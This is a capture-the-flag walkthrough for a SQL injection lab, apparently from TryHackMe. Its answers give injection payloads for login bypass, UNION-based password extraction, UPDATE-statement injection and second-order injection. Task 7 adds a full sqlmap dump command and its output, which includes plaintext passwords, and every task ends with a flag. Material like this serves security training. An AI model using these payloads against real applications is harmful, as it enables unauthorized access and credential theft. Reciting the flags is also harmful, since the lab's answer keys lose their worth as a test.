> # SQL Injection Lab

## Summary
- [Summary](#summary)
  - [Task 2 - Introduction to SQL Injection: Part 1](#task-2---introduction-to-sql-injection-part-1)
  - [Task 3 - Introduction to SQL Injection: Part 2](#task-3---introduction-to-sql-injection-part-2)
  - [Task 4 - Vulnerable Startup: Broken Authentication](#task-4---vulnerable-startup-broken-authentication)
  - [Task 5 - Vulnerable Startup: Broken Authentication 2](#task-5---vulnerable-startup-broken-authentication-2)
  - [Task 6 - Vulnerable Startup: Broken Authentication 3 (Blind Injection)](#task-6---vulnerable-startup-broken-authentication-3-blind-injection)
  - [Task 7 - Vulnerable Startup: Vulnerable Notes](#task-7---vulnerable-startup-vulnerable-notes)
  - [Task 8 - Vulnerable Startup: Change Password](#task-8---vulnerable-startup-change-password)
  - [Task 9 - Vulnerable Startup: Book Title](#task-9---vulnerable-startup-book-title)
  - [Task 10 - Vulnerable Startup: Book Title 2](#task-10---vulnerable-startup-book-title-2)

### Task 2 - Introduction to SQL Injection: Part 1
1. What is the flag for SQL Injection 1: Input Box Non-String?<br>
    Use the payload `1 or 2=2 --` on `ProfileID` field to bypass login form.<br>
    **Answer:** THM{dccea429d73d4a6b4f117ac64724f460}

1. What is the flag for SQL Injection 2: Input Box String?<br>
    Use the payload `1' or 2=2 --` on `ProfileID` field to bypass login form.<br>
    **Answer:** THM{356e9de6016b9ac34e02df99a5f755ba}

1. What is the flag for SQL Injection 3: URL Injection?<br>
    You can re-use the payload in Q2 and paste in on URL, the browser will automate decode the special characters.<br>
    **Answer:** THM{645eab5d34f81981f5705de54e8a9c36}

1. What is the flag for SQL Injection 4: POST Injection?<br>
    Use BurpSuite to modify the request before sending.<br>
    **Answer:** THM{727334fd0f0ea1b836a8d443f09dc8eb}

### Task 3 - Introduction to SQL Injection: Part 2
1. What is the flag for SQL Injection 5: UPDATE Statement?<br>
    Use this payload `',nickName=(SELECT group_concat(id ||  "," || secret|| ":") from secrets),email='`.<br>
    **Answer:** THM{b3a540515dbd9847c29cffa1bef1edfb}

### Task 4 - Vulnerable Startup: Broken Authentication
1. What is the flag for this challenge?<br>
    Payload: `1' or 1=1 --`<br
    **Answer:** THM{f35f47dcd9d596f0d3860d14cd4c68ec}

### Task 5 - Vulnerable Startup: Broken Authentication 2
1. What is the flag for this challenge?<br>
    Use payload `' UNION SELECT 1,group_concat(password) FROM users-- -` in login form.<br>
    **Answer:** THM{fb381dfee71ef9c31b93625ad540c9fa}

### Task 6 - Vulnerable Startup: Broken Authentication 3 (Blind Injection)
1. What is the flag for this challenge?<br>
    Use `sqlmap` to retrive the flag.<br>
    **Answer:** THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}

### Task 7 - Vulnerable Startup: Vulnerable Notes
1. What is the flag for this challenge?<br>
    Use `sqlmap` to dump the database.<br>
    ```
    $ sqlmap --tamper tamper/so-tamper.py --url http://10.10.51.149:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.51.149:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
            ___
        __H__                                                                                                                                                                               
    ___ ___[.]_____ ___ ___  {1.9.2#stable}                                                                                                                                                   
    |_ -| . [(]     | .'| . |                                                                                                                                                                  
    |___|_  ["]_|_|_|__,|  _|                                                                                                                                                                  
        |_|V...       |_|   https://sqlmap.org                                                                                                                                               

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 12:02:44 /2025-04-05/

    [12:02:44] [INFO] loading tamper module 'so-tamper'
    [12:02:44] [INFO] testing connection to the target URL
    got a 302 redirect to 'http://10.10.51.149:5000/challenge4/login?next=http%3A%2F%2F10.10.51.149%3A5000%2Fchallenge4%2Fnotes'. Do you want to follow? [Y/n] y
    you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
    [12:02:52] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
    [12:02:55] [INFO] testing for SQL injection on POST parameter 'username'
    it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
    [12:03:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [12:03:08] [WARNING] reflective value(s) found and filtering out
    [12:04:25] [INFO] target URL appears to be UNION injectable with 2 columns
    [12:04:36] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
    [12:04:36] [INFO] checking if the injection point on POST parameter 'username' is a false positive
    POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
    sqlmap identified the following injection point(s) with a total of 32 HTTP(s) requests:
    ---
    Parameter: username (POST)
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: username=admin' UNION ALL SELECT NULL,CHAR(113,122,118,107,113)||CHAR(103,87,101,105,122,83,110,69,102,116,68,69,72,79,99,118,101,77,97,67,115,72,66,83,121,79,82,79,66,80,84,84,78,102,104,67,85,77,116,107)||CHAR(113,120,118,106,113)-- tGHn&password=asd
    ---
    [12:05:02] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
    [12:05:02] [INFO] testing SQLite
    [12:05:06] [INFO] confirming SQLite
    [12:05:10] [INFO] actively fingerprinting SQLite
    [12:05:13] [INFO] the back-end DBMS is SQLite
    back-end DBMS: SQLite
    [12:05:13] [INFO] fetching columns for table 'users' 
    [12:05:17] [INFO] fetching entries for table 'users'
    Database: <current>
    Table: users
    [51 entries]
    +----+---------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | id | password                              | username                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
    +----+---------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | 1  | rcLYWHCxeGUsA9tH3GNV                  | admin                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
    | 2  | asd                                   | dev                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
    | 3  | Summer2019!                           | amanda                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
    | 4  | 345m3io4hj3                           | maja                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
    | 5  | THM{4644c7e157fd5498e7e4026c89650814} | xxxFLAGxxx                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
    | 6  | viking123                             | emil                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
    | 7  | asd                                   | admin),)'...").                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
    | 8  | asd                                   | admin'ydascl<'">iuygcq                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
    | 9  | asd                                   | admin') order by 1-- veyw                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
    | 10 | asd                                   | admin' order by 1-- mise                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
    | 11 | asd                                   | admin) order by 1-- yyiq                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
    | 12 | asd                                   | admin order by 1-- nxux                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
    | 13 | asd                                   | admin order by 1-- rcuq                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
    | 14 | asd                                   | admin'.(),,((."                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
    | 15 | asd                                   | admin'vodzsz<'">cdzdjb                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
    | 16 | asd                                   | admin') order by 1-- deui                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
    | 17 | asd                                   | admin') union all select null-- suyo                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
    | 18 | asd                                   | admin') union all select null,null-- nwfq                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
    | 19 | asd                                   | admin') union all select null,null,null-- obdo                                                                                                                                                                                                                                                                                                                                                                                                                                                |
    | 20 | asd                                   | admin') union all select null,null,null,null-- ubtu                                                                                                                                                                                                                                                                                                                                                                                                                                           |
    | 21 | asd                                   | admin') union all select null,null,null,null,null-- ytqk                                                                                                                                                                                                                                                                                                                                                                                                                                      |
    | 22 | asd                                   | admin') union all select null,null,null,null,null,null-- wgdd                                                                                                                                                                                                                                                                                                                                                                                                                                 |
    | 23 | asd                                   | admin') union all select null,null,null,null,null,null,null-- mfys                                                                                                                                                                                                                                                                                                                                                                                                                            |
    | 24 | asd                                   | admin') union all select null,null,null,null,null,null,null,null-- wwrd                                                                                                                                                                                                                                                                                                                                                                                                                       |
    | 25 | asd                                   | admin') union all select null,null,null,null,null,null,null,null,null-- jgde                                                                                                                                                                                                                                                                                                                                                                                                                  |
    | 26 | asd                                   | admin') union all select null,null,null,null,null,null,null,null,null,null-- cawr                                                                                                                                                                                                                                                                                                                                                                                                             |
    | 27 | asd                                   | admin' order by 1-- qnfn                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
    | 28 | asd                                   | admin' union all select null-- enss                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
    | 29 | asd                                   | admin' union all select null,null-- busc                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
    | 30 | asd                                   | admin' union all select null,null,null-- pfor                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
    | 31 | asd                                   | admin' union all select null,null,null,null-- qtcp                                                                                                                                                                                                                                                                                                                                                                                                                                            |
    | 32 | asd                                   | admin' union all select null,null,null,null,null-- otpe                                                                                                                                                                                                                                                                                                                                                                                                                                       |
    | 33 | asd                                   | admin' union all select null,null,null,null,null,null-- ytrp                                                                                                                                                                                                                                                                                                                                                                                                                                  |
    | 34 | asd                                   | admin' union all select null,null,null,null,null,null,null-- vuut                                                                                                                                                                                                                                                                                                                                                                                                                             |
    | 35 | asd                                   | admin' union all select null,null,null,null,null,null,null,null-- zsic                                                                                                                                                                                                                                                                                                                                                                                                                        |
    | 36 | asd                                   | admin' union all select null,null,null,null,null,null,null,null,null-- sftw                                                                                                                                                                                                                                                                                                                                                                                                                   |
    | 37 | asd                                   | admin' union all select null,null,null,null,null,null,null,null,null,null-- rtbf                                                                                                                                                                                                                                                                                                                                                                                                              |
    | 38 | asd                                   | admin' union all select null,char(113,122,118,107,113)||char(103,87,101,105,122,83,110,69,102,116,68,69,72,79,99,118,101,77,97,67,115,72,66,83,121,79,82,79,66,80,84,84,78,102,104,67,85,77,116,107)||char(113,120,118,106,113)-- tghn                                                                                                                                                                                                                                                        |
    | 39 | asd                                   | admin' union all select null,char(113,122,118,107,113)||char(103,87,101,105,122,83,110,69,102,116,68,69,72,79,99,118,101,77,97,67,115,72,66,83,121,79,82,79,66,80,84,84,78,102,104,67,85,77,116,107)||char(113,120,118,106,113) union all select null,char(113,122,118,107,113)||char(113,109,65,71,88,75,84,80,108,72,109,70,97,100,100,122,115,73,100,72,103,70,121,70,72,104,105,120,74,70,75,71,65,117,102,105,120,65,98,87)||char(113,120,118,106,113)-- xqph                            |
    | 40 | asd                                   | admin' union all select null,char(113,122,118,107,113)||char(103,87,101,105,122,83,110,69,102,116,68,69,72,79,99,118,101,77,97,67,115,72,66,83,121,79,82,79,66,80,84,84,78,102,104,67,85,77,116,107)||char(113,120,118,106,113) from (select 0 as rgbc union select 1 union select 2 union select 3 union select 4 union select 5 union select 6 union select 7 union select 8 union select 9 union select 10 union select 11 union select 12 union select 13 union select 14) as ebtw-- doya |
    | 41 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (22=22) then 1 else 0 end))||char(113,120,118,106,113)-- hznt                                                                                                                                                                                                                                                                                                                                                      |
    | 42 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (22=32) then 1 else 0 end))||char(113,120,118,106,113)-- udaa                                                                                                                                                                                                                                                                                                                                                      |
    | 43 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (22=85) then 1 else 0 end))||char(113,120,118,106,113)-- ibnk                                                                                                                                                                                                                                                                                                                                                      |
    | 44 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (85=32) then 1 else 0 end))||char(113,120,118,106,113)-- scgm                                                                                                                                                                                                                                                                                                                                                      |
    | 45 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (32=32) then 1 else 0 end))||char(113,120,118,106,113)-- vyhq                                                                                                                                                                                                                                                                                                                                                      |
    | 46 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (85 32) then 1 else 0 end))||char(113,120,118,106,113)-- hcgd                                                                                                                                                                                                                                                                                                                                                      |
    | 47 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (last_insert_rowid()=last_insert_rowid()) then 1 else 0 end))||char(113,120,118,106,113)-- acqs                                                                                                                                                                                                                                                                                                                    |
    | 48 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (sqlite_version()=sqlite_version()) then 1 else 0 end))||char(113,120,118,106,113)-- spog                                                                                                                                                                                                                                                                                                                          |
    | 49 | asd                                   | admin' union all select null,char(113,122,118,107,113)||(select (case when (randomblob(-1)>0) then 1 else 0 end))||char(113,120,118,106,113)-- rjus                                                                                                                                                                                                                                                                                                                                           |
    | 50 | asd                                   | admin' union all select null,max(char(113,122,118,107,113)||sql)||char(113,120,118,106,113) from sqlite_master where type=char(116,97,98,108,101) and tbl_name=char(117,115,101,114,115)-- oxne                                                                                                                                                                                                                                                                                               |
    | 51 | asd                                   | admin' __REFLECTED_VALUE__                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
    +----+---------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

    [12:05:20] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.51.149/dump/SQLite_masterdb/users.csv'
    [12:05:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.51.149'
    ```
    **Answer:** THM{4644c7e157fd5498e7e4026c89650814}

### Task 8 - Vulnerable Startup: Change Password
1. What is the flag for this challenge?<br>
    Crete user `admin'-- -`, then update the password and the password will be updated for the real admin account.<br>
    **Answer:** THM{cd5c4f197d708fda06979f13d8081013}

### Task 9 - Vulnerable Startup: Book Title
1. What is the flag for this challenge?<br>
    Payload `') union select 1,group_concat(username),group_concat(password),4 from users-- -`<br>
    **Answer:** THM{27f8f7ce3c05ca8d6553bc5948a89210}

### Task 10 - Vulnerable Startup: Book Title 2
1. What is the flag for this challenge?<br>
    Payload `' union select '-1''union select 1,group_concat(username),group_concat(password),4 from users-- -`.<br>
    **Answer:** THM{183526c1843c09809695a9979a672f09}
